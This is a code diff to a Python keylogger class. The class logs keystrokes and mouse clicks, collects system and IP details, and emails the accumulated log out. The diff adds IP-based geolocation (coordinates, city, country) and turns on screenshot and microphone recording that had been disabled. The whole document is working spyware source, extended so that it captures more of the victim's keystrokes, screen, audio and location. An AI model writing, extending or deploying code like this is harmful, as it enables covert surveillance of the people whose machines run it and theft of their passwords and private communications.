@@ -5,6 +5,7 @@ import time
 import wave
 import pyscreenshot
 import sounddevice as sd
+import geocoder
 from pynput import keyboard, mouse
 from dotenv import load_dotenv
 from utils import (
@@ -58,18 +59,16 @@ class KeyLogger:
             self.log = self.log + string
 
     def on_move(self, x, y):
-        # current_move = "\nMouse moved to {} {}".format(x, y)
+        # current_move = f"\nMouse moved to {x} {y}"
         # self.appendlog(current_move)
         pass  # do nothing
 
     def on_click(self, x, y, button, pressed):
-        current_click = "\nMouse click at {} {} with button {}".format(x, y, button)
+        current_click = f"\nMouse click at {x} {y} with button {button}"
         self.appendlog(current_click)
 
     def on_scroll(self, x, y, dx, dy):
-        # current_scroll = "\nMouse scrolled at {} {} with scroll distance {} {}".format(
-        #     x, y, dx, dy
-        # )
+        # current_scroll = f"\nMouse scrolled at {x} {y} with scroll distance {dx} {dy}"
         # self.appendlog(current_scroll)
         pass  # do nothing
 
@@ -82,10 +81,10 @@ class KeyLogger:
             elif key == key.esc:
                 current_key = "ESC"
             else:
-                current_key = " " + str(key) + " "
+                current_key = f" {str(key)} "
 
         self.word = self.word + current_key
-        self.appendlog("\nPressed key: {0}".format(current_key))
+        self.appendlog(f"\nPressed key: {current_key}")
 
     def send_mail(self, message):
         send_mail_with_attachment(
@@ -103,13 +102,15 @@ class KeyLogger:
         )
 
     def report(self):
-        self.send_mail("\n\n\n" + self.log)
+        self.send_mail(f"\n\n\n{self.log}")
         print(self.log)
 
     def cleanup(self):
         self.log = ""
-        self.keyboard_listener.stop()
-        self.mouse_listener.stop()
+        if self.keyboard_listener and self.keyboard_listener.running:
+            self.keyboard_listener.stop()
+        if self.mouse_listener and self.mouse_listener.running:
+            self.mouse_listener.stop()
         self.word = ""
         delete_wav_and_png_files()
 
@@ -119,11 +120,30 @@ class KeyLogger:
         processor = platform.processor()
         system = platform.system()
         machine = platform.machine()
-        self.appendlog("\nHostname = " + hostname)
-        self.appendlog("\nIP = " + ip)
-        self.appendlog("\nProcessor = " + processor)
-        self.appendlog("\nSystem OS = " + system)
-        self.appendlog("\nMachine architecture = " + machine)
+        self.appendlog("\nSystem info:")
+        self.appendlog(f"\nHostname = {hostname}")
+        self.appendlog(f"\nIP = {ip}")
+        self.appendlog(f"\nProcessor = {processor}")
+        self.appendlog(f"\nSystem OS = {system}")
+        self.appendlog(f"\nMachine architecture = {machine}")
+
+    def get_location(self):
+        location = geocoder.ip("me")
+
+        self.appendlog("\nLocation info:")
+
+        if location.ok:
+            latitude, longitude = location.latlng
+            city = location.city
+            state = location.state
+            country = location.country
+
+            self.appendlog(f"\nGeo position = {latitude} {longitude}")
+            self.appendlog(f"\nCity = {city}")
+            self.appendlog(f"\nState = {state}")
+            self.appendlog(f"\nCountry = {country}")
+        else:
+            self.appendlog("\nLocation not determined.")
 
     def microphone(self):
         fs = 44100
@@ -147,6 +167,9 @@ class KeyLogger:
 
     def run(self):
         while True:
+            self.system_information()
+            self.get_location()
+
             self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
             self.keyboard_listener.start()
 
@@ -154,9 +177,9 @@ class KeyLogger:
                 on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
             )
             self.mouse_listener.start()
-            self.system_information()
-            # self.screenshot()
-            # self.microphone()
+
+            self.screenshot()
+            self.microphone()
 
             # if os.name == "nt":
             #     try:
